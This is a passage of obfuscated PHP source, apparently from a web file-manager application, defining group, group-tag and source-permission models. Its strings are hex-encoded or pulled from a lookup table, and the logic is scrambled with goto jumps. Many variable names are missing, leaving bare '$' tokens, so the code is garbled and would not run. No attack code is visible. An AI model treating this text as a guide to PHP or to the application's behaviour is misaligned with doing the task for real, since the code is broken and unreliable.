Model($ς[1373])->where($ôɞ)->count(); $Ğ = Model($ς[1957])->where($ôɞ)->count(); $ρ = intval($) + intval($Ğ); if ($ρ == 0) { IO::remove($[$ς[84]]); Model($ς[1958])->delete($[$ς[509]]); $this->where($ôɞ)->delete(); $this->metaSet($[$ς[509]], null, null); return; } if ($[$ς[1953]] != $ρ) { $this->where($ôɞ)->save(array($ς[1946] => $ρ)); } } public function storageInfo($ = false) { $굉 =& $_SERVER[]; $ = $this->count() + 0.0; $ = 0; $ą = 1; $ġ = 0; $݉ = 5000; for ($ = 0; $ < $; $ = $ + $݉) { $ = $this->limit($, $ + $݉)->select(); foreach ($ as $) { $ą += $[$굉[76]] * $[$굉[1953]]; $ += $[$굉[76]] * ($[$굉[1953]] - 1); $ġ += $[$굉[1953]]; } } $ = array($굉[1959] => $ą, $굉[1960] => $, $굉[1961] => $ / $ą, $굉[80] => $, $굉[1962] => $ġ); return $; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\160"; protected $tableMeta = array("\164\141\142\154\145\116\141\155\145" => "\x67\162\157\165\x70\x5f\155\145\164\x61", "\x6d\x65\164\x61\106\x69\x65\154\x64" => "\x67\162\157\x75\x70\111\104"); protected function cacheFunctionAlias($՜١) { $ =& $_SERVER[]; return array($[1963] => array($՜١[0], $[1964]), $[1965] => array($՜١[0], $[1966])); } protected function getInfo($ѡ, $ȞԹ = false) { $ō = $this->getInfoSimple($ѡ); if (!$ō) { return !1; } if ($ȞԹ) { return $this->_listDataApplyItem($ō); } return $this->cacheFunctionGet($_SERVER[][1967], $ѡ); } protected function getInfoSimple($, $ߓȆ = false) { $ċ =& $_SERVER[]; if ($ߓȆ) { $ = array($ċ[1885] => intval($)); $ġؒ = $this->where($)->find(); return is_array($ġؒ) ? $ġؒ : array(); } return $this->cacheFunctionGet($ċ[1968], $); } protected function groupAdd($ʃ) { $匴 =& $_SERVER[]; if (!$ʃ[$匴[180]] && isset($ʃ[$匴[1885]]) && $ʃ[$匴[1885]] == 1) { if ($Ϫ = $this->getInfoSimple($ʃ[$匴[1885]], !0)) { return $ʃ[$匴[1885]]; } } else { $Ϫ = $this->getInfoSimple($ʃ[$匴[180]]); if (!$Ϫ) { return !1; } } $ = $匴[563]; if ($Ϫ[$匴[553]]) { $ = $Ϫ[$匴[553]] . $Ϫ[$匴[1885]] . $匴[50]; } $ = array($匴[462] => $this->groupNameAuto($ʃ[$匴[180]], $ʃ[$匴[32]]), $匴[445] => $ʃ[$匴[180]], $匴[620] => $, $匴[1969] => $ʃ[$匴[1872]], $匴[1970] => 0, $匴[1889] => 0); if (isset($ʃ[$匴[1909]])) { $[$匴[1909]] = $ʃ[$匴[1909]]; } else { $ = $this->max($匴[1909]); if (!$) { $ = 0; } $[$匴[1909]] = $ + 1; } if (!empty($ʃ[$匴[1885]])) { $[$匴[1885]] = $ʃ[$匴[1885]]; } $ = $this->add($); $this->setNamePinyin($, $[$匴[32]]); if (isset($ʃ[$匴[1971]])) { $this->metaSet($, array($匴[1971] => $ʃ[$匴[1971]], $匴[1972] => $ʃ[$匴[1972]])); unset($ʃ[$匴[1971]]); unset($ʃ[$匴[1972]]); } Model($匴[1373])->groupRootAdd($); $this->_clearCache($ʃ[$匴[180]]); return $; } protected function groupEdit($ɹ, $) { $Ǳܛ =& $_SERVER[]; $Ψ = $this->getInfoSimple($ɹ); if (!$Ψ) { return !1; } if (!empty($[$Ǳܛ[180]])) { $݀ = $this->getInfoSimple($[$Ǳܛ[180]]); if (!$݀) { return !1; } if ($Ψ[$Ǳܛ[1885]] == $݀[$Ǳܛ[1885]]) { return !1; } if ($[$Ǳܛ[180]] != $Ψ[$Ǳܛ[180]]) { if ($݀[$Ǳܛ[553]] !== $Ψ[$Ǳܛ[553]] && strpos($݀[$Ǳܛ[553]], $Ψ[$Ǳܛ[553]] . $Ψ[$Ǳܛ[1885]] . $Ǳܛ[50]) === 0) { return !1; } $[$Ǳܛ[620]] = $݀[$Ǳܛ[553]] . $[$Ǳܛ[180]] . $Ǳܛ[50]; $this->_changeChildLevel($Ψ, $݀); $this->_clearCache($݀[$Ǳܛ[1885]]); $this->_clearCache($Ψ[$Ǳܛ[180]]); } } if (isset($[$Ǳܛ[32]])) { $this->setNamePinyin($ɹ, $[$Ǳܛ[32]]); } if (isset($[$Ǳܛ[1971]])) { $this->metaSet($ɹ, array($Ǳܛ[1971] => $[$Ǳܛ[1971]], $Ǳܛ[1972] => $[$Ǳܛ[1972]])); unset($[$Ǳܛ[1971]]); unset($[$Ǳܛ[1972]]); } $this->_clearChildrenCache($Ψ); return $this->where(array($Ǳܛ[1973] => $ɹ))->save($); } private function _clearChildrenCache($) { $ژ =& $_SERVER[]; $Ĥ = array($ژ[620] => array($ژ[580], $[$ژ[553]] . $[$ژ[1885]] . $ژ[581])); $̪ = $this->field($ژ[1885])->where($Ĥ)->select(); foreach ($̪ as $ꐷ) { $this->_clearCache($ꐷ[$ژ[1885]]); } } private function _clearCache($٨) { $ޗ =& $_SERVER[]; $this->cacheFunctionClear($ޗ[1967], $٨); $this->cacheFunctionClear($ޗ[1968], $٨); } private function _changeChildLevel($̭, $Ã, $ = false) { $ڊ =& $_SERVER[]; $ = $̭[$ڊ[553]] . $̭[$ڊ[1885]] . $ڊ[50]; $ = $Ã[$ڊ[553]] . $Ã[$ڊ[1885]] . $ڊ[50] . $̭[$ڊ[1885]] . $ڊ[50]; if ($) { $ = $Ã[$ڊ[553]] . $Ã[$ڊ[1885]] . $ڊ[50]; } $ċ = array($ڊ[620] => array($ڊ[580], $̭[$ڊ[553]] . $̭[$ڊ[1885]] . $ڊ[581])); $ٮ = array($ڊ[620] => array($ڊ[629], "\162\145\160\x6c\x61\143\x65\x28\160\x61\x72\145\x6e\164\x4c\145\x76\x65\x6c\54\x27{$}\47\x2c\x27{$}\x27\x29")); $this->_clearChildrenCache($̭); $this->where($ċ)->data($ٮ)->save(); } public function setNamePinyin($, $ = false) { $ =& $_SERVER[]; if (!$) { $ض = $this->getInfoSimple($); $ = $ض[$[32]]; } if (!Input::check($, $[623])) { $this->metaSet($, $[506], null); $this->metaSet($, $[505], null); return; } $Ȣ쭊 = array($[506] => str_replace($[53], $[12], Pinyin::get($)), $[505] => Pinyin::get($, $[624])); $this->metaSet($, $Ȣ쭊); } protected function groupStatus($, $) { $޾ =& $_SERVER[]; $⤢ = $this->getInfoSimple($); if (!$⤢) { return !1; } if ($ == $޾[88]) { $∴ = $this->parentLevelArray($⤢[$޾[553]]); } else { $۔Ԉ = array($޾[620] => array($޾[580], $⤢[$޾[553]] . $⤢[$޾[1885]] . $޾[581])); $∴ = $this->where($۔Ԉ)->field($޾[1885])->select(); $∴ = array_to_keyvalue($∴, $޾[12], $޾[1885]); } $∴[] = $⤢[$޾[1885]]; $ = array(); foreach ($∴ as $) { $[] = array($޾[1885] => $, $޾[94] => $޾[784], $޾[418] => $); $this->_clearCache($); } return Model($޾[1974])->addAll($, array(), !0); } protected function groupRemove($ƺ, $套̿ = false) { $ԽԤ =& $_SERVER[]; $ = array($ԽԤ[1885] => $ƺ); $ = $this->where($)->find(); if (!$ || $[$ԽԤ[180]] == 0) { return !1; } if (!$套̿) { $ = $this->getInfoSimple($[$ԽԤ[180]]); $this->_changeChildLevel($, $, !0); $this->where(array($ԽԤ[180] => $ƺ))->save(array($ԽԤ[180] => $[$ԽԤ[180]])); $this->_clearCache($[$ԽԤ[1885]]); } Model($ԽԤ[1974])->where($)->delete(); Model($ԽԤ[1975])->where($)->delete(); Model($ԽԤ[859])->groupRootRemove($ƺ); $this->_clearCache($[$ԽԤ[180]]); return $this->where($)->delete(); } protected function groupSort($Ɍ) { $͸ =& $_SERVER[]; $ռ = array(); foreach ($Ɍ as $٘ => $) { $ռ[] = array($͸[1885], $, $͸[1909], $٘ + 1); } $this->saveAll($ռ); } public function listData() { $ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($[$_SERVER[][413]]); return $; } private function _makeOrder($ŶϪ = '') { $ =& $_SERVER[]; $忒 = array($[1885], $[32], $[1874], $[215]); $頧£ = array($[491] => $[492], $[493] => $[494]); $ź = Input::get($[498], $[7], $[1889], $忒); $ = Input::get($[499], $[7], $[1976], array($[1976], $[493])); $ = $頧£[$]; $ŶϪ = $ŶϪ . "{$ź}\x20{$}\54\40\x67\x72\x6f\x75\x70\x49\104\x20\141\x73\143"; return $this->order($ŶϪ); } public function listChild($âճ) { $ =& $_SERVER[]; $ = $this->where(array($[180] => $âճ))->_makeOrder()->selectPage(200); $this->_listDataApply($[$[413]]); return $; } public function listChildIds($ʧ) { $ּ =& $_SERVER[]; if (is_string($)) { $ʧ = explode($ּ[50], $ʧ); } $î = $this->where(array($ּ[1885] => array($ּ[7], $ʧ)))->field($ּ[1977])->select(); if (!$î) { return !1; } $ = array(); foreach ($î as $ܒヤ) { $[] = "\163\145\154\x65\143\x74\40\x67\162\x6f\x75\x70\x49\104\x20\146\162\157\x6d\40\140\147\162\x6f\x75\160\x60\x20\x77\150\145\x72\145\x20\160\141\x72\145\x6e\x74\x4c\145\x76\145\x6c\40\x6c\151\153\x65\40\x27{$ܒヤ[$ּ[553]]}{$ܒヤ[$ּ[1885]]}\54\x25\47"; } $ = implode($ּ[1978], $); $î = $this->query($); if (!$î) { return array(); } $ʧ = array_to_keyvalue($î, $ּ[12], $ּ[1885]); return array_unique($ʧ); } public function listByID($) { $˱ =& $_SERVER[]; if (!$) { return array(); } $ʵ = array($˱[1885] => array($˱[7], $)); $Ų = $this->where($ʵ)->select(); $Ų = array_sort_keep($Ų, $˱[1885], $); $this->_listDataApply($Ų); return $Ų; } public function listSearch($) { $ =& $_SERVER[]; $ʌ = $[$[1979]]; $ = isset($[$[1980]]) ? $[$[1980]] : !1; if (!trim($ʌ)) { return !1; } $ʌ = str_replace($[1981], $[1982], $ʌ); $ݬ = array($[1885] => array($[427], "{$ʌ}\45"), $[32] => array($[427], "\45{$ʌ}\x25"), $[1039] => $[1983]); if ($) { $ = $this->getInfoSimple($); $߮Ѩ = $[$[553]] . $ . $[581]; $ݬ = array($ݬ, array($[553] => array($[427], $߮Ѩ))); } $ݬ = $this->parseWhereLike($ݬ); $斷 = $this->_makeOrder()->where($ݬ)->selectPage(20); $斷 = $斷 ? $斷 : array($[413] => array(), $[410] => array()); if (!$斷 || count($斷[$[413]]) < 5 && Input::check($ʌ, $[362])) { $нҀ = $this->groupChildrenAll($); $Ъ = $this->_searchFromMeta($[505], $ʌ, 10, $нҀ); $ס̜ = $this->_searchFromMeta($[506], $ʌ, 10, $нҀ); $ = array_merge($Ъ, $ס̜, $斷[$[413]]); $斷[$[413]] = array_unique_by_key($, $[1885]); $斷[$[410]][$[411]] = count($斷[$[413]]); $斷[$[410]][$[412]] = ceil($斷[$[410]][$[411]] / $斷[$[410]][$[407]]); } $this->_listDataApply($斷[$[413]]); return $斷; } protected function groupChildrenAll($ٸ) { $ =& $_SERVER[]; if (!$ٸ) { return !1; } if (is_string($ٸ)) { $ٸ = array($ٸ); } $ȁܠ = $ٸ; foreach ($ٸ as $ɩч) { $ˮж = $this->getInfoSimple($ɩч); $ϸ = array($[553] => array($[427], $ˮж[$[553]] . $ɩч . $[581])); $ֆ = $this->field($[1885])->where($ϸ)->select(); $ȁܠ = array_merge($ȁܠ, array_to_keyvalue($ֆ, $[12], $[1885])); } return array_unique($ȁܠ); } private function _searchFromMeta($Єк, $߼Ȝ, $Ԭ, $矁) { $ֵ =& $_SERVER[]; $߼Ȝ = strtolower($߼Ȝ); $ɦ = array($ֵ[94] => $Єк, $ֵ[418] => array($ֵ[427], "\x25{$߼Ȝ}\45")); $ɦ = $this->parseWhereLike($ɦ); if ($矁) { $ɦ[$ֵ[1885]] = array($ֵ[7], $矁); } $ձ = Model($ֵ[1984])->where($ɦ)->limit($Ԭ)->select(); if (!$ձ) { return array(); } $ձ = array_to_keyvalue($ձ, $ֵ[12], $ֵ[1885]); $̓ = $this->where(array($ֵ[1973] => array($ֵ[7], $ձ)))->select(); if (!$̓) { return array(); } return $̓; } protected function _listDataApplyItem($Սχ) { $ě = array($Սχ); $this->_listDataApply($ě); return $ě[0]; } protected function _listDataApply(&$ۣ) { $ß =& $_SERVER[]; if (!$ۣ) { return; } $ַ = array_to_keyvalue($ۣ, $ß[12], $ß[1885]); $this->_listAppendChildren($ۣ); $this->_listAppendChildrenMember($ۣ); $this->_listAppendMeta($ۣ, $ַ); $this->_listAppendParent($ۣ); $this->_listAppendSourceRoot($ۣ, $ַ); } private function _listAppendChildren(&$罌) { $Χ =& $_SERVER[]; $ƙ = array_to_keyvalue($罌, $Χ[12], $Χ[1885]); $ӧ = array($Χ[180] => array($Χ[7], $ƙ)); $츼 = array($Χ[180], $Χ[1985] => $Χ[533]); $ = $this->field($츼)->where($ӧ)->group($Χ[180])->select(); $ب = array_to_keyvalue($, $Χ[180], $Χ[533]); foreach ($罌 as &$) { $ = $[$Χ[1885]]; $[$Χ[1986]] = isset($ب[$]) ? intval($ب[$]) : !1; } unset($); } private function _listAppendChildrenMember(&$ݗ) { $ =& $_SERVER[]; $꓈ = array_to_keyvalue($ݗ, $[12], $[1885]); $Έ = array($[1885] => array($[7], $꓈)); $˨ = array($[1885], $[1985] => $[533]); $ = Model($[1975])->field($˨)->where($Έ)->group($[1885])->select(); $ = array_to_keyvalue($, $[1885], $[533]); foreach ($ݗ as &$ʈ) { $ = $ʈ[$[1885]]; $ʈ[$[1987]] = isset($[$]) ? intval($[$]) : !1; } unset($ʈ); } private function _listAppendMeta(&$ⴴ, $桚) { $Ƚ =& $_SERVER[]; $֧ = array($Ƚ[1885] => array($Ƚ[7], $桚)); $ = Model($Ƚ[1974])->where($֧)->select(); $ = array_to_keyvalue_group($, $Ƚ[1885]); foreach ($ as &$ǆ) { $ǆ = array_to_keyvalue($ǆ, $Ƚ[94], $Ƚ[418]); } unset($ǆ); foreach ($ⴴ as &$炶) { $炶[$Ƚ[507]] = array(); if (isset($[$炶[$Ƚ[1885]]])) { $炶[$Ƚ[507]] = $[$炶[$Ƚ[1885]]]; } } unset($炶); } protected function parentLevelArray($ন) { $ =& $_SERVER[]; $ন = explode($[50], trim($ন, $[50])); $ন = array_remove_value($ন, $[212]); return $ন; } protected function parentInGroup($, $橊) { $粦 =& $_SERVER[]; $ = $this->getInfoSimple($); if (!$) { return !0; } $ = $this->parentLevelArray($[$粦[553]]); $[] = $; foreach ($ as $) { if (in_array($ . $粦[12], $橊)) { return !0; } } return !1; } private function _listAppendParent(&$) { $ =& $_SERVER[]; $㚲 = array(); foreach ($ as &$ʀ) { $㚲[$ʀ[$[1885]]] = $ʀ[$[32]]; $ʅ = $this->parentLevelArray($ʀ[$[553]]); foreach ($ʅ as $Ϛ) { if (!isset($㚲[$Ϛ])) { $㚲[$Ϛ] = 0; } } } unset($ʀ); foreach ($㚲 as $ɱ => $ޏ) { if ($ޏ) { continue; } $ = $this->getInfoSimple($ɱ); $㚲[$ɱ] = $[$[32]]; } $ = $GLOBALS[$[6]][$[89]][$[1988]]; if ($GLOBALS[$[536]] == $[88]) { $ = !1; } foreach ($ as &$ʀ) { $ʅ = $this->parentLevelArray($ʀ[$[553]]); $Ћ = $[12]; foreach ($ʅ as $ɱ => $Ϛ) { if ($ && $ɱ == 0) { continue; } $Ћ .= $㚲[$Ϛ] . $[8]; } if ($ʅ) { $Ћ .= $ʀ[$[32]]; } $ʀ[$[558]] = str_replace($[561], $[8], $Ћ); } unset($ʀ); } private function _listAppendSourceRoot(&$, $ۓ) { $ =& $_SERVER[]; $ = Model($[859])->listSourceRoot(SourceModel::TYPE_GROUP, $ۓ); $ = array_to_keyvalue($, $[538]); $ = array_remove_key($, $[538]); foreach ($ as &$é) { $é[$[87]] = $[$é[$[1885]]] ? $[$é[$[1885]]] : array(); } unset($é); } protected function groupMerge($н) { $н = array_values(array_unique($н)); $ = array(); for ($٭ = 0; $٭ < count($н); $٭++) { $Ŋ旵 = !1; for ($χ = 0; $χ < count($н); $χ++) { if ($٭ == $χ) { continue; } if ($this->isParentOf($н[$χ], $н[$٭])) { $Ŋ旵 = !0; break; } } if (!$Ŋ旵) { $[] = $н[$٭]; } } return $; } protected function isParentOf($ު, $Ѕ) { $؋ =& $_SERVER[]; if (!$ު || !$Ѕ || $ު == $Ѕ) { return !1; } $ = $this->getInfoSimple($ު); $ȉ = $this->getInfoSimple($Ѕ); $߻ = $[$؋[553]] . $ު . $؋[50]; if (substr($ȉ[$؋[553]], 0, strlen($߻)) == $߻) { return !0; } return !1; } public function groupShowRoot($, $ը = false) { $ =& $_SERVER[]; $ = $this->getInfo($); if (!$) { return array(); } $Տ = $this->parentLevelArray($[$[553]]); $ = array($); if (count($Տ) == 0) { return $; } if ($ը && count($Տ) == 1) { return $; } if (!$[$[507]] || !isset($[$[507]][$[1971]]) || $[$[507]][$[1971]] == $[1940]) { return $this->groupShowRoot($Տ[count($Տ) - 1], $ը); } if ($[$[507]][$[1971]] == $[401]) { $銾 = explode($[50], $[$[507]][$[1972]]); if ($銾) { $ = array_merge($, $銾); } } return $; } protected function resetParentLevel() { $ͮҰ =& $_SERVER[]; $뛠 = $ͮҰ[1885]; $ې = $this->select(); $ې = array_to_keyvalue($ې, $뛠); foreach ($ې as $) { $Ŕť = $; $ȍ = array(); while ($Ŕť[$ͮҰ[180]] != 0) { $ȍ[] = $Ŕť[$ͮҰ[180]]; $Ŕť = $ې[$Ŕť[$ͮҰ[180]]]; } $ȍ[] = 0; $ȍ = $ͮҰ[50] . implode($ͮҰ[50], array_reverse($ȍ)) . $ͮҰ[50]; $this->setNamePinyin($[$뛠], $[$ͮҰ[32]]); $this->where(array($뛠 => $[$뛠]))->save(array($ͮҰ[620] => $ȍ)); } return $ې; } public function groupNameAuto($, $̡) { $ܨƋ =& $_SERVER[]; $Տ = $this->where(array($ܨƋ[445] => $))->getField($ܨƋ[32], !0); if (!$Տ || !in_array($̡, $Տ)) { return $̡; } for ($ = 1; $ <= count($Տ) + 1; $++) { $׏߰ = $̡ . "\50{$}\51"; if (!in_array($׏߰, $Տ)) { return $׏߰; } } } public function groupSwitch($؞, $ɒ) { $ =& $_SERVER[]; $Ԃ = array($[1885] => array($[7], array($؞, $ɒ))); $ = $this->where($Ԃ)->select(); $ = array_to_keyvalue($, $[1885]); if (!isset($[$؞]) || !isset($[$ɒ]) || $[$؞][$[180]] == 0) { return !1; } $Ԃ = array($[1885] => $؞); $قڒ = Model($[1975])->where($Ԃ)->select(); if (!$قڒ) { $قڒ = array(); } foreach ($قڒ as $ା) { $ = $ା[$[1687]]; $Ԃ = array($[1687] => $, $[1885] => $ɒ); $ = Model($[1975])->where($Ԃ)->find(); if (!$) { $ ݓ = array($ɒ => $ା[$[1989]]); Model($[567])->userGroupAdd($, $ ݓ); } Model($[567])->userGroupRemove($, $؞); } $Ԃ = array($[178] => 2, $[180] => 0, $[453] => 1, $[538] => array($[7], array($؞, $ɒ))); $ڷ = Model($[859])->where($Ԃ)->field($[1990])->select(); $ڷ = array_to_keyvalue($ڷ, $[538], $[181]); $ݒ = !empty($ڷ[$؞]) ? $ڷ[$؞] : !1; if ($ݒ) { if (!$ڷ[$ɒ]) { $ڷ[$ɒ] = Model($[859])->groupRootAdd($ɒ); } $ = $ڷ[$ɒ]; $Ԃ = array($[180] => $ݒ); $ڷ = Model($[859])->where($Ԃ)->field($[1991])->select(); if (!$ڷ) { $ڷ = array(); } Model($[859])->moveClearAuth = !1; foreach ($ڷ as $) { $ = $[$[453]] == $[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($[859])->move($[$[181]], $, $); } Model($[859])->moveClearAuth = !0; $Ԃ = array($[178] => 2, $[538] => $؞); $ = array($[538] => $ɒ); Model($[1992])->where($Ԃ)->save($); Model($[1993])->where($Ԃ)->save($); } $this->_changeChildLevel($[$؞], $[$ɒ], !0); $this->where(array($[180] => $؞))->save(array($[180] => $ɒ)); $this->_clearChildrenCache($[$ɒ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($ٚ) { $ʄ̮ =& $_SERVER[]; return array($ʄ̮[1994] => array($ٚ[0], $ʄ̮[1995]), $ʄ̮[1996] => array($ٚ[0], $ʄ̮[1997])); } protected function get($) { $ʁ =& $_SERVER[]; $Х = Model($ʁ[554])->metaGet($, $ʁ[1998]); $ = json_decode($Х, !0); return $ ? $ : array($ʁ[1999] => $ʁ[88], $ʁ[413] => array()); } protected function set($÷, $) { $ =& $_SERVER[]; $ = $ ? $ : array($[1999] => $[88], $[413] => array()); return Model($[554])->metaSet($÷, $[1998], json_encode($)); } protected function getByTagID($, $݈ݕ) { $ =& $_SERVER[]; if (!$ || !$݈ݕ) { return !1; } if (!Model($[554])->getInfoSimple($)) { return !1; } $鮸 = $this->get($); if (!$鮸 || !isset($鮸[$[413]])) { return !1; } $ = array_find_by_field($鮸[$[413]], $[443], $݈ݕ); return is_array($) ? $ : !1; } public function listSource($î, $䏃) { $ =& $_SERVER[]; if ($䏃 && !is_array($䏃)) { $䏃 = array($䏃); } $ȟ = $this->listData($î); $ѷ = array(); foreach ($ȟ as $֋) { $ = $֋[$[84]]; if (!$) { continue; } if (!isset($ѷ[$])) { $ѷ[$] = array(); } $ѷ[$][] = $֋[$[468]]; } $ = array(); foreach ($ѷ as $ҋ => $⅀) { $ґՊ = !0; if (!$䏃) { $[] = $ҋ; continue; } foreach ($䏃 as $) { if (!in_array($, $⅀)) { $ґՊ = !1; break; } } if ($ґՊ) { $[] = $ҋ; } } if (!$) { return array(); } $ = array($[459] => array($[460], $), $[538] => $î, $[178] => SourceModel::TYPE_GROUP); $ж = Model($[1373])->listSource($); if (!$ж || count($) == $ж[$[410]][$[411]]) { return $ж; } $¹ = array(); $ = array_to_keyvalue($ж[$[82]], $[12], $[181]); $񇇖 = array_to_keyvalue($ж[$[83]], $[12], $[181]); $ɬ = array_merge($񇇖, $); foreach ($ as $) { if (!in_array($, $ɬ)) { $¹[] = $; } } if ($¹) { $this->removeBySource($î, $¹); } return $ж; } protected function listData($ΰؼ) { $ð =& $_SERVER[]; $ = array($ð[1678] => 0, $ð[525] => array($ð[2000], 0), $ð[464] => $ð[2001] . $ΰؼ); $ = $ð[2002]; $ڟ = $this->field($)->where($)->order($ð[2003])->select(); return $ڟ ? $ڟ : array(); } protected function addToTag($, $ُɄ, $) { $Ӫ =& $_SERVER[]; if (!$this->getByTagID($, $) || !$ُɄ) { return !1; } if (!Model($Ӫ[859])->pathInfo($ُɄ)) { return !1; } $ = array($Ӫ[1678] => 0, $Ӫ[525] => $, $Ӫ[463] => $ُɄ, $Ӫ[464] => $Ӫ[2004] . $, $Ӫ[462] => $Ӫ[12], $Ӫ[1889] => 0); if ($this->where($)->find()) { return !1; } return $this->add($); } protected function removeFromTag($, $, $) { $݄ͫ =& $_SERVER[]; if (!$this->getByTagID($, $) || !$) { return !1; } if (is_array($)) { $ = array($݄ͫ[7], $); } $⦺ = array($݄ͫ[1678] => 0, $݄ͫ[525] => $, $݄ͫ[464] => $݄ͫ[2004] . $, $݄ͫ[463] => $); return $this->where($⦺)->delete(); } protected function removeByTag($⺧, $ၯ) { $޼ =& $_SERVER[]; if (!$this->getByTagID($⺧, $ၯ)) { return !1; } $ = array($޼[1678] => 0, $޼[525] => $ၯ, $޼[464] => $޼[2004] . $⺧); return $this->where($)->delete(); } protected function removeBySource($ݼ, $Ϛ) { $´ =& $_SERVER[]; if (!$ݼ || !$Ϛ) { return !1; } if (is_array($Ϛ)) { $Ϛ = array($´[7], $Ϛ); } $̯ = array($´[1678] => 0, $´[463] => $Ϛ, $´[525] => array($´[1053], 0), $´[464] => $´[2004] . $ݼ); return $this->where($̯)->delete(); } } goto B; A: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\x63\145\x5f\x61\x75\164\x68"; public function getAuth($ݛؼ) { $ =& $_SERVER[]; $ = $this->sourceAuthSelect($ݛؼ); $ﮟ = array(); $ŗ = array(); $ٽ = 2 << 25; foreach ($ as $) { $쐔 = Model($[540])->listData($[$[1989]]); if (!$쐔) { continue; } $ﮟ[] = $; $Ԓ = 0; if ($[$[178]] == SourceModel::TYPE_GROUP) { $Ԓ = $ٽ * 2; } if ($[$[178]] == SourceModel::TYPE_USER) { $Ԓ = $ٽ; } if ($[$[178]] == SourceModel::TYPE_USER && $[$[538]] == $[212]) { $Ԓ = 0; } $ŗ[] = $쐔[$[455]] + $Ԓ; } array_multisort($ŗ, SORT_DESC, $ﮟ); return $ﮟ; } public function sourceAuthSelect($) { $ =& $_SERVER[]; static $Άѥ = array(); $ = is_array($) ? !1 : !0; if ($) { $ = array($); } $ǫݵ = array(); foreach ($ as $) { if (isset($Άѥ[$])) { $ǫݵ[$] = $Άѥ[$]; } } if (count($ǫݵ) == count($)) { return $ ? $ǫݵ[$[0]] : $ǫݵ; } $ = $[2066]; $ = array($[181] => array($[7], $)); $ڄ = $this->field($)->order($[443])->where($)->select(); $ഝ = array_to_keyvalue_group($ڄ, $[181]); foreach ($ as $) { $Άѥ[$] = $ഝ[$] ? $ഝ[$] : array(); } if ($) { return $ڄ; } return $ഝ; } public function setAuth($䒩, $Δ) { $ =& $_SERVER[]; $󪋄 = Model($[1373])->sourceInfo($䒩); if (!$󪋄) { return !1; } if ($󪋄[$[178]] != SourceModel::TYPE_GROUP) { return !1; } $ȫպ = 1; $ϳ = $󪋄[$[538]]; if ($ϳ != $ȫպ) { $Ⱦ = array($[1885] => $ϳ); $Һ = Model($[1975])->field($[1687])->where($Ⱦ)->select(); $Һ = array_to_keyvalue($Һ, $[12], $[1687]); } $ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ = array(); foreach ($Δ as $) { if (!in_array($[$[178]], $)) { show_json(LNG($[2067]), !1); } if ($ϳ != $ȫպ) { if ($[$[178]] == SourceModel::TYPE_GROUP) { } if ($[$[538]] != 0 && !in_array($[$[538]], $Һ)) { } } if ($[$[538]] == 0) { $[$[178]] = SourceModel::TYPE_USER; } $[] = array($[181] => $䒩, $[178] => intval($[$[178]]), $[538] => intval($[$[538]]), $[1989] => intval($[$[1989]]) ? intval($[$[1989]]) : 0, $[2049] => intval($[$[2049]]) ? intval($[$[2049]]) : -1); } $this->where(array($[459] => $䒩))->delete(); $this->addAll($); return !0; } public function authClear($Ҹ) { $ҥ =& $_SERVER[]; $Ʌ = Model($ҥ[1373])->sourceInfo($Ҹ); $ = array($Ҹ); if ($Ʌ[$ҥ[453]] == $ҥ[88]) { $ = array($ҥ[620] => array($ҥ[580], $Ʌ[$ҥ[553]] . $Ҹ . $ҥ[581])); $ = Model($ҥ[1373])->field($ҥ[459])->where($)->getField($ҥ[181], !0); $[] = $Ҹ; } $this->where(array($ҥ[459] => array($ҥ[460], $)))->delete(); return !0; } public function getAllChildren($ԅ) { $ =& $_SERVER[]; $ = Model($[1373])->sourceInfo($ԅ); if ($[$[453]] != $[88]) { return $this->sourceListAuth(array($ԅ)); } if ($[$[178]] != SourceModel::TYPE_GROUP) { return array(); } $߆ = 1; $Ϗ = array($ԅ); if ($[$[180]] == $[212] && $[$[538]] != $߆) { $Ϗ = $this->groupChidldAllRootSource($[$[538]]); } $ = $this->field($[181])->group($[181])->select(); $ = array_to_keyvalue($, $[12], $[181]); if (!$) { return array(); } $ = $[2068]; $񟫪 = array($[181] => array($[7], $), $[473] => $[212]); $ = Model($[859])->field($)->where($񟫪)->select(); $ = array($ԅ); foreach ($ as $) { foreach ($Ϗ as $ᲈ) { $ۭἑ = $[50] . $ᲈ . $[50]; $ = $[$[553]] . $[$[181]] . $[50]; if (strstr($, $ۭἑ)) { $[] = $[$[181]]; break; } } } return $this->sourceListAuth($); } private function sourceListAuth($Қ񝄝) { $ה =& $_SERVER[]; $ = Model($ה[1373])->sourceListInfo($Қ񝄝, !0); $ = $this->sourceAuthSelect($Қ񝄝); $ = array(); $Չ = array(); foreach ($ as $) { unset($[$ה[497]]); unset($[$ה[495]]); unset($[$ה[455]]); unset($[$ה[87]]); $ = $[$[$ה[181]]]; if (!$) { continue; } $[$ה[2069]] = $this->authTargetInfo($); $[$ה[551]] = rtrim($[$ה[557]], $ה[8]) . $ה[8] . ltrim($[$ה[551]], $ה[8]); $[] = $; $¦ = count(explode($ה[8], trim($[$ה[551]], $ה[8]))); $Չ[] = $¦ + ($[$ה[33]] == $ה[75] ? 0 : 1000); } array_multisort($Չ, SORT_ASC, $); return $; } private function groupChidldAllRootSource($) { $߻ =& $_SERVER[]; $ = Model($߻[2070])->groupChildrenAll($); $ = array($߻[180] => 0, $߻[538] => array($߻[7], $), $߻[178] => SourceModel::TYPE_GROUP); $ = Model($߻[859])->field($߻[181])->where($)->select(); $ = array_to_keyvalue($, $߻[12], $߻[181]); return $; } private function authTargetInfo($) { $Ǽ =& $_SERVER[]; $ = array(); $ = array(); $ = 2 << 25; foreach ($ as $̙) { $Ԫ = Model($Ǽ[540])->listData($̙[$Ǽ[1989]]); if (!$Ԫ) { continue; } if ($̙[$Ǽ[178]] == SourceModel::TYPE_USER) { $ = Model($Ǽ[546])->getInfoSimpleOuter($̙[$Ǽ[538]]); if ($[$Ǽ[1687]] == $Ǽ[1229]) { continue; } if ($[$Ǽ[1687]] == $Ǽ[212]) { $[$Ǽ[32]] = LNG($Ǽ[2071]); } } else { $ = Model($Ǽ[554])->getInfoSimple($̙[$Ǽ[538]]); } if (!$) { continue; } $[$Ǽ[508]] = $Ԫ; $[] = $; $ϲ = 0; if ($̙[$Ǽ[178]] == SourceModel::TYPE_GROUP) { $ϲ = $ * 2; } if ($̙[$Ǽ[178]] == SourceModel::TYPE_USER) { $ϲ = $; } if 